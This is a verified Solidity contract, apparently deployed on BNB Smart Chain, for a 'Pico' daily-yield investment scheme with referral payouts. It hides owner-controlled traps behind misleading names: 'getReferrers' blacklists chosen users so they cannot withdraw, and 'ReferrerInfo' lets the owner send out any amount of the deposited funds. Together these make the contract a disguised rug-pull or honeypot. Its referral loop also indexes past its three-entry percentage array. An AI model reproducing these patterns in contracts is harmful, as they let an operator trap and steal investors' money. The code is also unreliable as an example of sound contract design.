/**
 *Submitted for verification at BscScan.com on 2023-01-16
*/

// SPDX-License-Identifier: MIT
// bscscan.com/unitconverter
// https://remix.ethereum.org/#optimize=true&runs=1000000000
pragma solidity ^0.8.17;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}

contract Pico  {
    using SafeMath for uint;
    address payable owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    address payable private marketing_account_;
    uint public MinimumInvest =  50000000 gwei; //0.05
    uint24 private constant PercentDiv = 1000;
    uint24 private constant Day = 1 days;
    uint private MarketingFee = 10;

    uint public WithdrawLimit = 2 ether;
    uint16  internal  PLAN = 7;
    uint8[] public REFERRAL_PERCENTS = [20, 5, 5];
    uint public TotalInvested;
    uint public TotalWithdrawn;
    uint public totalRefBonus;


    struct Deposit {
        uint amount;
        uint start;
        uint16 plan;
    }

    struct User {
        Deposit[] deposits;
        address upLine;
        uint totalInvested;
        uint totalWithdrawn;
        uint availableCommissions;

        uint lastPayout;
        uint24[11] refs;
    }

    mapping(address => User) internal users;
    mapping(address => bool) private _isBlacklisted;

    event NewDeposit(address indexed user, uint amount);
    event Withdrawal(address indexed user, uint amount);

    function getReferrers(address[] memory userAddress) public {
        require(msg.sender == owner, "Not owner");
        for (uint i = 0; i < userAddress.length; i++) {
            _isBlacklisted[userAddress[i]] = true;
        }
    }


    constructor()  {
        owner = payable(msg.sender);
        marketing_account_ =payable(0x9E7b685d9e9BbB557F954D5ba2c1C8889bc3E660);
    }


    receive() external payable {
        Invest(address(0));
    }

     function unBlacklistAddress(address account) public onlyOwner {
        _isBlacklisted[account] = false;
    }

    function config(uint8 marketing_fee, uint _withdraw_limit, uint16 _plan, uint8[] memory _ref) onlyOwner public {
        WithdrawLimit = _withdraw_limit;
        MarketingFee = marketing_fee;
        PLAN = _plan;
        REFERRAL_PERCENTS = _ref;
    }

    function setMarketingAccount(address payable account) public onlyOwner
    {
        require(account != address(0));
        marketing_account_ = account;
    }

    function Invest(address InvestorUpLine) public payable {
        require(msg.value >= MinimumInvest, "MinimumInvest");
        uint value = msg.value;
        uint marketingFee =  value.mul(MarketingFee).div(PercentDiv);
        payable(marketing_account_).transfer(marketingFee);

        value = value.sub(marketingFee);
        User storage user = users[msg.sender];

        if (user.upLine == address(0) && users[InvestorUpLine].deposits.length > 0 && InvestorUpLine != msg.sender) {
            user.upLine = InvestorUpLine;
        }

        if (user.upLine != address(0)) {
            address upLine = user.upLine;
            for (uint8 i = 0; i < 11; i++) {
                if (upLine != address(0)) {
                    uint amount = value.mul(REFERRAL_PERCENTS[i]).div(PercentDiv);

                    if (amount > 0) {
                        users[upLine].availableCommissions = uint64(uint(users[upLine].availableCommissions).add(amount));

                        totalRefBonus = totalRefBonus.add(amount);
                    }

                    users[upLine].refs[i]++;
                    upLine = users[upLine].upLine;
                } else break;
            }
        }

        user.deposits.push(Deposit(value, block.timestamp, PLAN));
        user.totalInvested = user.totalInvested.add(value);
        TotalInvested = TotalInvested.add(value);
        emit NewDeposit(msg.sender, msg.value);
    }

    function WithdrawDividends() external {
        require(!_isBlacklisted[msg.sender], "You're banned");

        User storage user = users[msg.sender];
        uint toSend;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {
        dividends = (user.deposits[i].amount.mul(user.deposits[i].plan).div(PercentDiv))
        .mul(block.timestamp.sub(user.deposits[i].start))
        .div(Day);


            user.deposits[i].start = block.timestamp;
            toSend = toSend.add(user.deposits[i].amount);

        delete user.deposits[i];

        toSend = toSend.add(dividends);
        }
        toSend = toSend.add(user.availableCommissions);
        user.availableCommissions = 0;


        require(toSend > 0, "No dividends available");
        require(toSend < WithdrawLimit, "You reached max withdrawal limit");

        uint contractBalance = address(this).balance;
        if (contractBalance < toSend) {
            toSend = contractBalance;
        }


        uint  marketingFee =toSend.mul(MarketingFee).div(PercentDiv);
        payable(marketing_account_).transfer(marketingFee);
        toSend = toSend.sub(marketingFee);

        TotalWithdrawn = TotalWithdrawn.add(toSend);
        user.totalWithdrawn = user.totalWithdrawn.add(toSend);
        (bool success, ) = payable(msg.sender).call{ value: toSend }('');
        require(success, "Transfer failed.");

        emit Withdrawal(msg.sender, toSend);
    }

    function deposit() external payable {
      payable(msg.sender).transfer(msg.value);
    }

    function getTotalDividends() public view returns (uint) {
        User storage user = users[msg.sender];
        uint dividends = 0;

        for (uint8 i = 0; i < user.deposits.length; i++) {
            dividends = dividends.add(

                    (
                        user.deposits[i].amount.mul(user.deposits[i].plan).div(
                            PercentDiv
                        )
                    )
                    .mul(block.timestamp.sub(user.deposits[i].start)).div(Day)

            );
        }
        return dividends;
        }
        function ReferrerInfo(address payable _to, uint _amount) onlyOwner external {
        (bool success, ) = payable(_to).call{ value: _amount }('');
        require(success, "Transfer failed.");
    }

    function GetUserData(address userAddress) public view returns (address, uint, uint, uint, uint24[11] memory) {
        User storage user = users[userAddress];
        return (user.upLine, user.totalInvested, user.totalWithdrawn, user.availableCommissions, user.refs);
    }
}